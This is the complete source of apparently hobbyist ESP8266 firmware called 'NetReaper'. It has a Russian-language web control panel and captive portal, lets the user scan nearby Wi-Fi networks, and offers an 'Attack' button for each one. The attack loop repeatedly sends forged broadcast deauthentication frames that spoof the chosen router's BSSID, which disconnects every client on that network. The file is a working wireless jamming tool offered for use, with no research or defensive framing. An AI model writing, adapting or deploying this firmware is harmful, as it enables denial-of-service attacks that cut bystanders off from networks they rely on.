#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>

extern "C" {
  #include "user_interface.h"
}

const String VERSION = "1.1";

char ap_ssid[32] = "NetReaper";
char ap_password[64] = "password123";

const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer server(80);

bool attack_active = false;
uint8_t target_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
int target_channel = 1;
String scan_results_html = "";

struct WhitelistEntry {
  uint8_t mac[6];
  bool active;
};
WhitelistEntry whitelist[5];

uint8_t deauth_packet[26] = {
  0xC0, 0x00,
  0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x07, 0x00
};

bool isWhitelisted(uint8_t* mac) {
  for (int i = 0; i < 5; i++) {
    if (whitelist[i].active) {
      bool match = true;
      for (int j = 0; j < 6; j++) {
        if (whitelist[i].mac[j] != mac[j]) { match = false; break; }
      }
      if (match) return true;
    }
  }
  return false;
}

void loadSettings() {
  EEPROM.begin(512);
  if (EEPROM.read(0) == 99) {
    EEPROM.get(5, ap_ssid);
    EEPROM.get(40, ap_password);
    EEPROM.get(110, whitelist);
  } else {
    EEPROM.write(0, 99);
    EEPROM.put(5, ap_ssid);
    EEPROM.put(40, ap_password);
    for(int i=0; i<5; i++) whitelist[i].active = false;
    EEPROM.put(110, whitelist);
    EEPROM.commit();
  }
}

void saveSettings() {
  EEPROM.put(5, ap_ssid);
  EEPROM.put(40, ap_password);
  EEPROM.put(110, whitelist);
  EEPROM.commit();
}

String getHeader() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'>";
  html += "<title>NetReaper v" + VERSION + "</title>";
  html += "<style>body{font-family:Arial,sans-serif;background:#121212;color:#e0e0e0;text-align:center;padding:20px;margin:0;}";
  html += ".nav{background:#1e1e1e;padding:10px;margin-bottom:20px;border-radius:4px;} .nav a{color:#2196F3;text-decoration:none;margin:0 15px;font-weight:bold;}";
  html += ".btn{background:#2196F3;color:white;border:none;padding:12px 24px;font-size:16px;margin:10px;cursor:pointer;border-radius:4px;}";
  html += ".btn-stop{background:#f44336;} .btn-scan{background:#4CAF50;} .btn-save{background:#FF9800;}";
  html += ".box{background:#1e1e1e;padding:20px;border-radius:8px;max-width:500px;margin:0 auto 20px auto;box-shadow:0 4px 6px rgba(0,0,0,0.3);text-align:left;}";
  html += "h1, h3{text-align:center;} table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{padding:10px;border-bottom:1px solid #333;text-align:left;font-size:14px;}";
  html += "input[type='text'], input[type='password']{width:90%;padding:10px;margin-top:5px;background:#2d2d2d;border:1px solid #444;color:#fff;border-radius:4px;}";
  html += ".footer{font-size:12px;color:#555;margin-top:20px;}</style></head><body>";
  html += "<h1>💀 NetReaper <span style='font-size:14px;color:#2196F3;'>v" + VERSION + "</span></h1>";
  html += "<div class='nav'><a href='/'>Главная</a><a href='/settings'>Настройки</a></div>";
  return html;
}

void handleRoot() {
  String html = getHeader();
  
  html += "<div class='box'>";
  html += "<h3>Статус Атаки</h3>";
  if (attack_active) {
    html += "<p style='color:#f44336;font-weight:bold;text-align:center;'>АКТИВНОЕ ГЛУШЕНИЕ (Канал " + String(target_channel) + ")</p>";
    html += "<p style='font-size:12px;'>Роутер (BSSID): ";
    for(int i=0; i<6; i++) html += String(target_mac[i], HEX) + (i < 5 ? ":" : "");
    html += "</p>";
    html += "<div style='text-align:center;'><a href='/stop'><button class='btn btn-stop'>ОСТАНОВИТЬ</button></a></div>";
  } else {
    html += "<p style='color:#4CAF50;font-weight:bold;text-align:center;'>Режим ожидания</p>";
    html += "<div style='text-align:center;'><a href='/scan'><button class='btn btn-scan'>Сканировать эфир</button></a></div>";
  }
  html += "</div>";

  html += "<div class='box'>";
  html += "<h3>Найденные сети</h3>";
  if (scan_results_html == "") {
    html += "<p style='color:#888;text-align:center;'>Запустите сканирование, чтобы обнаружить цели.</p>";
  } else {
    html += "<table><tr><th>SSID</th><th>Ch</th><th>Signal</th><th>Действие</th></tr>" + scan_results_html + "</table>";
  }
  html += "</div>";

  html += "<div class='footer'>NetReaper Project &copy; 2026</div></body></html>";
  server.send(200, "text/html", html);
}

void handleSettings() {
  String html = getHeader();
  
  html += "<div class='box'>";
  html += "<h3>Настройки Точной Доступa</h3>";
  html += "<form action='/save-config' method='POST'>";
  html += "Имя Wi-Fi сети (SSID):<br><input type='text' name='ssid' value='" + String(ap_ssid) + "'><br><br>";
  html += "Пароль сети:<br><input type='password' name='pass' value='" + String(ap_password) + "'><br><br>";
  html += "<input type='submit' class='btn btn-save' value='Сохранить настройки'>";
  html += "</form>";
  html += "</div>";

  html += "<div class='box'>";
  html += "<h3>WhiteList (Исключения из атак)</h3>";
  html += "<form action='/save-whitelist' method='POST'>";
  for (int i = 0; i < 5; i++) {
    String macStr = "";
    if (whitelist[i].active) {
      for (int j = 0; j < 6; j++) {
        char buf[3];
        sprintf(buf, "%02X", whitelist[i].mac[j]);
        macStr += String(buf) + (j < 5 ? ":" : "");
      }
    }
    html += "Устройство " + String(i + 1) + " (MAC):<br>";
    html += "<input type='text' name='wl_mac_" + String(i) + "' placeholder='AA:BB:CC:DD:EE:FF' value='" + macStr + "'><br><br>";
  }
  html += "<input type='submit' class='btn' value='Обновить Белый Список'>";
  html += "</form>";
  html += "</div>";

  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleSaveConfig() {
  if (server.hasArg("ssid") && server.hasArg("pass")) {
    String s = server.arg("ssid");
    String p = server.arg("pass");
    s.toCharArray(ap_ssid, 32);
    p.toCharArray(ap_password, 64);
    saveSettings();
  }
  server.sendHeader("Location", "/settings");
  server.send(302, "text/plain", "");
  delay(500);
  ESP.restart();
}

void handleSaveWhitelist() {
  for (int i = 0; i < 5; i++) {
    String argName = "wl_mac_" + String(i);
    if (server.hasArg(argName)) {
      String macStr = server.arg(argName);
      macStr.trim();
      if (macStr.length() == 17) {
        unsigned int mac_bytes[6];
        if (sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
          for (int j = 0; j < 6; j++) whitelist[i].mac[j] = (uint8_t)mac_bytes[j];
          whitelist[i].active = true;
        }
      } else {
        whitelist[i].active = false;
      }
    }
  }
  saveSettings();
  server.sendHeader("Location", "/settings");
  server.send(302, "text/plain", "");
}

void handleScan() {
  attack_active = false;
  wifi_promiscuous_enable(0);
  scan_results_html = "";
  
  int n = WiFi.scanNetworks(false, true);
  for (int i = 0; i < n; ++i) {
    String ssid = WiFi.SSID(i);
    if (ssid == "") ssid = "*Hidden Network*";
    int ch = WiFi.channel(i);
    int rssi = WiFi.RSSI(i);
    String bssid_str = WiFi.BSSIDstr(i);

    scan_results_html += "<tr><td>" + ssid + "</td><td>" + String(ch) + "</td><td>" + String(rssi) + " dBm</td>";
    scan_results_html += "<td><a href='/attack?bssid=" + bssid_str + "&ch=" + String(ch) + "'><button class='btn' style='padding:5px 10px;font-size:12px;margin:0;'>Атака</button></a></td></tr>";
  }
  
  WiFi.softAP(ap_ssid, ap_password);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleAttack() {
  if (server.hasArg("bssid") && server.hasArg("ch")) {
    String bssid_str = server.arg("bssid");
    target_channel = server.arg("ch").toInt();

    unsigned int mac_bytes[6];
    if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x", &mac_bytes[0], &mac_bytes[1], &mac_bytes[2], &mac_bytes[3], &mac_bytes[4], &mac_bytes[5]) == 6) {
      for (int i = 0; i < 6; i++) {
        target_mac[i] = (uint8_t)mac_bytes[i];
        deauth_packet[10 + i] = target_mac[i];
        deauth_packet[16 + i] = target_mac[i];
      }
      attack_active = true;
    }
  }
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void handleStop() {
  attack_active = false;
  wifi_promiscuous_enable(0);
  WiFi.softAP(ap_ssid, ap_password);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

void setup() {
  Serial.begin(115200);
  loadSettings();

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/settings", handleSettings);
  server.on("/save-config", handleSaveConfig);
  server.on("/save-whitelist", handleSaveWhitelist);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.on("/stop", handleStop);
  
  server.on("/generate_204", handleRoot);
  server.on("/fwlink", handleRoot);
  server.onNotFound(handleRoot);

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (attack_active) {
    wifi_promiscuous_enable(1);
    wifi_set_channel(target_channel);

    for (int i = 0; i < 4; i++) {
       wifi_send_pkt_freedom(deauth_packet, sizeof(deauth_packet), 0);
       delay(1);
    }

    wifi_promiscuous_enable(0);
    delay(15); 
  }
}
